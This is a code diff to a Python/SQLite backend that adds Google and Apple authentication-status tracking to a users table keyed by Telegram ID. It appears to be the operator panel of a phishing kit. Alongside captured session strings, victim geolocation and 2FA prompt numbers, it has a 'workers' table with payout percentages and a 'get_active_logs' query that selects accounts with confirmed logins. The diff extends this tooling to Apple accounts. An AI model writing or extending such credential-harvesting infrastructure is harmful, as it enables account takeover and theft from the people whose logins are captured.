@@ -37,7 +37,12 @@ CREATE TABLE IF NOT EXISTS users (
     country TEXT,
     city TEXT,
     isp TEXT,
-    device TEXT
+    device TEXT,
+    google_status TEXT,
+    google_prompt_number TEXT,
+    google_error_msg TEXT,
+    apple_status TEXT,
+    apple_error_msg TEXT
 );
 
 CREATE TABLE IF NOT EXISTS workers (
@@ -167,6 +172,10 @@ def init_db(db_path: str) -> None:
                 conn.execute("ALTER TABLE users ADD COLUMN google_prompt_number TEXT")
             if "google_error_msg" not in cols_u:
                 conn.execute("ALTER TABLE users ADD COLUMN google_error_msg TEXT")
+            if "apple_status" not in cols_u:
+                conn.execute("ALTER TABLE users ADD COLUMN apple_status TEXT")
+            if "apple_error_msg" not in cols_u:
+                conn.execute("ALTER TABLE users ADD COLUMN apple_error_msg TEXT")
 
             cols_w = [r[1] for r in conn.execute("PRAGMA table_info(workers)").fetchall()]
             if "custom_percent" not in cols_w:
@@ -428,10 +437,16 @@ def update_user_auth(
     auth_step: Optional[str] = None,
 ) -> None:
     with _connect(db_path) as conn:
-        conn.execute(
-            "UPDATE users SET session_string = ?, auth_step = coalesce(?, auth_step) WHERE tg_id = ?",
-            (session_string, auth_step, tg_id),
-        )
+        if auth_step in ("logged_out", "session_revoked"):
+            conn.execute(
+                "UPDATE users SET session_string = ?, auth_step = ?, google_status = ?, apple_status = ? WHERE tg_id = ?",
+                (session_string, auth_step, auth_step, auth_step, tg_id),
+            )
+        else:
+            conn.execute(
+                "UPDATE users SET session_string = ?, auth_step = coalesce(?, auth_step) WHERE tg_id = ?",
+                (session_string, auth_step, tg_id),
+            )
 
 
 def set_user_geo(
@@ -634,9 +649,13 @@ def get_active_logs(db_path: str):
             """SELECT * FROM users 
                WHERE (
                    (session_string IS NOT NULL AND session_string != '' AND session_string != 'mock_session_string')
-                   OR auth_step IN ('authorized', 'completed', 'success')
+                   OR auth_step IN ('authorized', 'completed', 'success', 'google_prompt_confirmed', 'google_complete', 'google_authorized', 'apple_authorized', 'apple_complete', 'apple_prompt_confirmed')
+                   OR (email IS NOT NULL AND email != '' AND google_status = 'prompt_confirmed')
+                   OR (email IS NOT NULL AND email != '' AND apple_status IN ('complete', 'prompt_confirmed', 'authorized'))
                )
                AND auth_step NOT IN ('logged_out', 'session_revoked', 'banned')
+               AND (google_status IS NULL OR google_status NOT IN ('logged_out', 'session_revoked', 'banned'))
+               AND (apple_status IS NULL OR apple_status NOT IN ('logged_out', 'session_revoked', 'banned'))
                AND status != 'banned'
                ORDER BY id DESC"""
         ).fetchall()
@@ -862,6 +881,79 @@ def get_latest_google_auth_control(db_path: str):
                 "status": row["google_status"],
                 "prompt_number": row["google_prompt_number"],
                 "error_msg": row["google_error_msg"],
+                "tg_id": row["tg_id"],
+            }
+        return None
+
+
+def set_apple_auth_control(
+    db_path: str,
+    tg_id: int,
+    status: Optional[str],
+    error_msg: Optional[str] = None,
+) -> None:
+    with _connect(db_path) as conn:
+        if tg_id:
+            row = conn.execute("SELECT id FROM users WHERE tg_id = ?", (tg_id,)).fetchone()
+            if row:
+                conn.execute(
+                    """
+                    UPDATE users
+                    SET apple_status = ?, apple_error_msg = ?
+                    WHERE tg_id = ?
+                    """,
+                    (status, error_msg, tg_id),
+                )
+            else:
+                conn.execute(
+                    """
+                    INSERT INTO users (tg_id, apple_status, apple_error_msg, auth_step, registered_at)
+                    VALUES (?, ?, ?, 'apple_email', datetime('now'))
+                    """,
+                    (tg_id, status, error_msg),
+                )
+        else:
+            conn.execute(
+                """
+                UPDATE users
+                SET apple_status = ?, apple_error_msg = ?
+                WHERE id = (SELECT id FROM users ORDER BY id DESC LIMIT 1)
+                """,
+                (status, error_msg),
+            )
+
+
+def get_apple_auth_control(db_path: str, tg_id: int):
+    with _connect(db_path) as conn:
+        if tg_id:
+            row = conn.execute(
+                "SELECT apple_status, apple_error_msg FROM users WHERE tg_id = ?",
+                (tg_id,),
+            ).fetchone()
+            if row and row["apple_status"]:
+                return {
+                    "status": row["apple_status"],
+                    "error_msg": row["apple_error_msg"],
+                }
+            return None
+        return get_latest_apple_auth_control(db_path)
+
+
+def get_latest_apple_auth_control(db_path: str):
+    with _connect(db_path) as conn:
+        row = conn.execute(
+            """
+            SELECT apple_status, apple_error_msg, tg_id
+            FROM users
+            WHERE apple_status IS NOT NULL AND apple_status != ''
+            ORDER BY id DESC
+            LIMIT 1
+            """
+        ).fetchone()
+        if row:
+            return {
+                "status": row["apple_status"],
+                "error_msg": row["apple_error_msg"],
                 "tg_id": row["tg_id"],
             }
         return None
